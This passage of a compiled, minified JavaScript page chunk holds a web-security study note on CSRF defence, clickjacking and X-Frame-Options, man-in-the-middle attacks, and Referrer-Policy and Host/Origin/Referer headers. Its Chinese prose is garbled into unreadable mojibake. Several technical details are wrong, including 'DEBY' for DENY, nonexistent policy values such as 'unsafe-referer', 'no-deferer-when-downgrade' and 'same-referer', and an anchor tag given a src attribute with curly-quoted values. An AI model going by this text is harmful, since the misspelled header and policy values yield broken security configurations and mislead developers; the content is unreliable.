äº†é¢å¤–çš„å­—æ®µã€‚"),a("br"),t._v("\nå¦‚æœæœ‰å…¶ä»–æ¼æ´ï¼ˆä¾‹å¦‚ XSSï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥ Cookieï¼Œé‚£ä¹ˆè¯¥é˜²å¾¡æ–¹å¼å¤±æ•ˆã€‚"),a("br"),t._v("\néš¾ä»¥åšåˆ°å­åŸŸåçš„éš”ç¦»ã€‚"),a("br"),t._v("\n-ä¸ºäº†ç¡®ä¿ Cookie ä¼ è¾“å®‰å…¨ï¼Œé‡‡ç”¨è¿™ç§é˜²å¾¡æ–¹å¼çš„æœ€å¥½ç¡®ä¿ç”¨æ•´ç«™ HTTPS çš„æ–¹å¼ï¼Œå¦‚æœè¿˜æ²¡åˆ‡ HTTPS çš„ä½¿ç”¨è¿™ç§æ–¹å¼ä¹Ÿä¼šæœ‰é£é™©ã€‚")]),t._v(" "),a("h2",{attrs:{id:"xss-æ”»å‡»å’Œ-csrf-æ”»å‡»åŒºåˆ«"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss-æ”»å‡»å’Œ-csrf-æ”»å‡»åŒºåˆ«"}},[t._v("#")]),t._v(" XSS æ”»å‡»å’Œ CSRF æ”»å‡»åŒºåˆ«")]),t._v(" "),a("p",[t._v("XSS æ”»å‡»å¤§å¤šå‘ç”Ÿåœ¨ç›®æ ‡ç½‘ç«™ï¼Œåˆ©ç”¨å—å®³è€…å¯¹ç›®æ ‡ç½‘ç«™çš„ä¿¡ä»»ï¼›"),a("br"),t._v("\nCSRF æ”»å‡»å¤§å¤šå‘ç”Ÿåœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œåˆ©ç”¨ç›®æ ‡ç½‘ç«™å¯¹å—å®³è€…å‡­è¯çš„ä¿¡ä»»ã€‚")]),t._v(" "),a("h2",{attrs:{id:"ç‚¹å‡»åŠ«æŒ"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ç‚¹å‡»åŠ«æŒ"}},[t._v("#")]),t._v(" ç‚¹å‡»åŠ«æŒ")]),t._v(" "),a("p",[t._v("ç‚¹å‡»åŠ«æŒï¼ˆclick hijacking)ï¼Œä¸»è¦æ˜¯é€šè¿‡æ„é€ ä¸€ä¸ªéå¸¸æœ‰å¸å¼•åŠ›çš„ç½‘é¡µ A æ¥è¯±æƒ‘è¯¯å¯¼è¢«æ”»å‡»è€…ç‚¹å‡»ï¼Œè¢«æ”»å‡»è€…ä»¥ä¸ºè‡ªå·±ç‚¹å‡»çš„æ˜¯å¯è§ç½‘é¡µ Aï¼Œä½†å…¶å®ç‚¹å‡»çš„æ˜¯å¦ä¸€ä¸ªç½®äºç½‘é¡µ A ä¸Šçš„é€æ˜ç½‘é¡µ Bã€‚")]),t._v(" "),a("p",[t._v("æµç¨‹ï¼š"),a("br"),t._v("\næ­¥éª¤ 1: æ”»å‡»è€…æ„å»ºä¸€ä¸ªæœ‰å¸å¼•åŠ›çš„ç½‘é¡µ Aï¼Œå¹¶å°†è¢«æ”»å‡»ç½‘é¡µ B é€šè¿‡ iframe çš„å½¢å¼åµŒå…¥å¹¶å åŠ è‡³ A ä¸Šæ–¹ï¼Œä¸”å°† iframe è®¾ç½®ä¸º 100%é€æ˜ï¼›"),a("br"),t._v("\næ­¥éª¤ 2: ç”¨æˆ·åœ¨ä¸çŸ¥é“è¯·çš„æƒ…å†µä¸‹ç‚¹å‡»æŒ‰é’® Bï¼Œè§¦å‘ä¸€äº›å‘½ä»¤ã€‚")]),t._v(" "),a("h3",{attrs:{id:"é˜²å¾¡æªæ–½"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#é˜²å¾¡æªæ–½"}},[t._v("#")]),t._v(" é˜²å¾¡æªæ–½")]),t._v(" "),a("p",[t._v("å› ä¸ºå…¶æ ¸å¿ƒæ˜¯å°†ç›®æ ‡ç½‘ç«™è½½å…¥è‡³æ¶æ„ç½‘ç«™ä¸­ï¼Œé€šè¿‡ iframe è½½å…¥ç½‘é¡µæ˜¯æœ‰æ•ˆçš„æ–¹æ³•ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å°†è‡ªå·±çš„ç½‘é¡µé…ç½®æˆä¸å…è®¸é€šè¿‡ iframe è½½å…¥è‡³å…¶ä»–ç½‘é¡µä¸­ã€‚")]),t._v(" "),a("p",[t._v("å¯¹æœåŠ¡å™¨é…ç½®å“åº”å¤´ï¼š"),a("code",[t._v("X-Frame-Options")]),t._v("ï¼š")]),t._v(" "),a("blockquote",[a("p",[a("code",[t._v("X-Frame-Options")]),t._v(" å“åº”æŠ¥å¤´å¯ä»¥è¢«ç”¨æ¥æŒ‡ç¤ºä¸€ä¸ªæµè§ˆå™¨æ˜¯å¦åº”è¯¥è¢«å…è®¸åœ¨ä¸€ä¸ªä»¥å‘ˆç°é¡µé¢"),a("code",[t._v("<frame>")]),t._v("ï¼Œ"),a("code",[t._v("<iframe>")]),t._v("æˆ–"),a("code",[t._v("<object>")]),t._v("ã€‚é€šè¿‡ç¡®ä¿å…¶å†…å®¹æœªåµŒå…¥å…¶ä»–ç½‘ç«™ï¼Œç½‘ç«™å¯ä»¥ä½¿ç”¨æ­¤åŠŸèƒ½æ¥é¿å…ç‚¹å‡»åŠ«æŒæ”»å‡»ã€‚")])]),t._v(" "),a("ul",[a("li",[a("code",[t._v("DEBY")]),t._v("ï¼šé…ç½®ç½‘é¡µä¸èƒ½è¢«åµŒå…¥åˆ°ä»»ä½• iframe ä¸­ï¼›")]),t._v(" "),a("li",[a("code",[t._v("SAMEORIGIN")]),t._v("ï¼šé…ç½®é¡µé¢åªèƒ½æ˜¾ç¤ºåœ¨ä¸é¡µé¢ç›¸åŒçš„åŸŸåä¸‹ï¼ˆåŒä¸ªç«™ç‚¹ï¼‰ä¸­ï¼›")]),t._v(" "),a("li",[a("code",[t._v("ALLOW-FROM https://example.com(uri)")]),t._v("ï¼šé…ç½®ä¹Ÿæ²¡åªèƒ½è¢«åµŒå…¥åˆ°æŒ‡å®šåŸŸåçš„ä¸­ã€‚")])]),t._v(" "),a("h2",{attrs:{id:"ä¸­é—´äººæ”»å‡»"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ä¸­é—´äººæ”»å‡»"}},[t._v("#")]),t._v(" ä¸­é—´äººæ”»å‡»")]),t._v(" "),a("p",[t._v("ä¸­é—´äººæ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…å’Œé€šè®¯çš„ä¸¤ç«¯åˆ†åˆ«åˆ›å»ºç‹¬ç«‹çš„è”ç³»ï¼Œå¹¶ä¸”äº¤äº’å…¶å¾—åˆ°çš„æ•°æ®ï¼Œæ”»å‡»è€…å¯ä»¥æ‹¦æˆªé€šä¿¡åŒæ–¹çš„é€šè¯å¹¶ä¸”æ’å…¥æ–°çš„å†…å®¹ã€‚")]),t._v(" "),a("h3",{attrs:{id:"é˜²å¾¡æ–¹å¼"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#é˜²å¾¡æ–¹å¼"}},[t._v("#")]),t._v(" é˜²å¾¡æ–¹å¼")]),t._v(" "),a("p",[t._v("é€šå¸¸é‡‡ç”¨ HTTPS é€šä¿¡å¯ä»¥é˜²å¾¡ä¸­é—´äººæ”»å‡»ã€‚")]),t._v(" "),a("h2",{attrs:{id:"referer-æ­£ç¡®æ‹¼å†™-referrer"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#referer-æ­£ç¡®æ‹¼å†™-referrer"}},[t._v("#")]),t._v(" Refererï¼ˆæ­£ç¡®æ‹¼å†™ referrerï¼‰")]),t._v(" "),a("h4",{attrs:{id:"è®¾ç½®ä¸‰ç§æ–¹æ³•"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#è®¾ç½®ä¸‰ç§æ–¹æ³•"}},[t._v("#")]),t._v(" è®¾ç½®ä¸‰ç§æ–¹æ³•")]),t._v(" "),a("ol",[a("li",[t._v("CSP")])]),t._v(" "),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[t._v("Content"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Security"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Policy"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" referrer "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("referrer"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("policy"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),a("ol",{attrs:{start:"2"}},[a("li",[t._v("meta å¤´")])]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("meta")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("referer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("content")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("same-origin"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n")])])]),a("ol",{attrs:{start:"3"}},[a("li",[t._v("a æ ‡ç­¾å¢åŠ  referrerpolicy å±æ€§")])]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("a")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("src")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),t._v("â€œhttp://xxxx.comâ€")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("referrerpolicy")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),t._v("â€œsame-refererâ€")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("h4",{attrs:{id:"referrerpolicy-æœ‰å“ªäº›å€¼"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#referrerpolicy-æœ‰å“ªäº›å€¼"}},[t._v("#")]),t._v(" referrerpolicy æœ‰å“ªäº›å€¼")]),t._v(" "),a("p",[t._v("originï¼šå‘é€åªåŒ…å« origin çš„ refererï¼Œå³åè®®åŸŸå")]),t._v(" "),a("p",[t._v("no-refererï¼šä¸å‘é€")]),t._v(" "),a("p",[t._v("unsafe-refererï¼šéƒ½å‘é€")]),t._v(" "),a("p",[t._v("same-origin:å¯¹åŒæºé“¾æ¥/å¼•ç”¨æ—¶å‘é€ refererï¼Œå…¶ä»–ä¸å‘é€")]),t._v(" "),a("p",[t._v("no-deferer-when-downgradeï¼ˆé»˜è®¤å€¼ï¼‰ï¼šåè®®é™çº§è®¿é—®æ—¶ä¸å‘é€")]),t._v(" "),a("p",[t._v("origin-when-crossoriginï¼šå¯¹åŒæºé“¾æ¥/å¼•ç”¨æ—¶å‘é€ refererï¼ŒéåŒæºå‘é€ origin")]),t._v(" "),a("p",[t._v("strict-originï¼šå®‰å…¨é™çº§ä¸å‘é€ï¼ˆæ–°åŠ çš„æ ‡å‡†ï¼‰")]),t._v(" "),a("p",[t._v("strict-origin-when-cross-originï¼šå®‰å…¨é™çº§ä¸å‘é€ï¼ŒåŒçº§åŒæºæ‰å‘é€ï¼ˆæ–°åŠ çš„æ ‡å‡†)")]),t._v(" "),a("h4",{attrs:{id:"åœ¨ä»¥ä¸‹æƒ…å†µä¸‹-referer-ä¸ä¼šè¢«å‘é€"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#åœ¨ä»¥ä¸‹æƒ…å†µä¸‹-referer-ä¸ä¼šè¢«å‘é€"}},[t._v("#")]),t._v(" åœ¨ä»¥ä¸‹æƒ…å†µä¸‹ï¼ŒReferer ä¸ä¼šè¢«å‘é€ï¼š")]),t._v(" "),a("ol",[a("li",[a("p",[t._v('æ¥æºé¡µé¢é‡‡ç”¨çš„åè®®ä¸ºè¡¨ç¤ºæœ¬åœ°æ–‡ä»¶çš„ "file" æˆ–è€… "data" URIï¼›')])]),t._v(" "),a("li",[a("p",[t._v("å½“å‰è¯·æ±‚é¡µé¢é‡‡ç”¨çš„æ˜¯éå®‰å…¨åè®®ï¼Œè€Œæ¥æºé¡µé¢é‡‡ç”¨çš„æ˜¯å®‰å…¨åè®®ï¼ˆHTTPSï¼‰ã€‚")])])]),t._v(" "),a("p",[t._v("3 .ç›´æ¥è¾“å…¥ç½‘å€æˆ–é€šè¿‡æµè§ˆå™¨ä¹¦ç­¾è®¿é—®")]),t._v(" "),a("ol",{attrs:{start:"4"}},[a("li",[a("p",[t._v("ä½¿ç”¨ JavaScript çš„ Location.href æˆ–è€…æ˜¯ Location.replace()")])]),t._v(" "),a("li",[a("p",[t._v("ä½¿ç”¨ html5 ä¸­ noreferrer")])])]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("a")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("href")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("/test/index.php?noreferer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("rel")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("noreferrer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("target")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("_blank"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("a")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("a")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("href")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("/test/index.php?noreferer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("rel")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("noreferrer"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("target")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("_blank"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("a")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("p",[t._v("6.ä½¿ç”¨ Referer Meta æ ‡ç­¾æ§åˆ¶ referer ä½¿ç”¨åœºæ™¯;")]),t._v(" "),a("p",[t._v("7.ä½¿ç”¨ iframe çš„ hack å†™æ³•å»é™¤ refererã€‚")]),t._v(" "),a("h2",{attrs:{id:"host-origin-referer-åŒºåˆ«"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#host-origin-referer-åŒºåˆ«"}},[t._v("#")]),t._v(" Host/origin/referer åŒºåˆ«")]),t._v(" "),a("ul",[a("li",[t._v("Originï¼šåè®®ï¼šåŸŸå")])]),t._v(" "),a("p",[t._v("åªæœ‰è·¨åŸŸè¯·æ±‚ï¼Œæˆ–è€…åŒåŸŸæ—¶å‘é€ post è¯·æ±‚ï¼Œæ‰ä¼šæºå¸¦ origin è¯·æ±‚å¤´")]),t._v(" "),a("ul",[a("li",[a("p",[t._v("Hostï¼šåŸŸåï¼šç«¯å£")])]),t._v(" "),a("li",[a("p",[t._v("refererï¼šåè®®ï¼šåŸŸåï¼šè·¯å¾„")])])])])}),[],!1,null,null,null);a.default=r.exports}}]);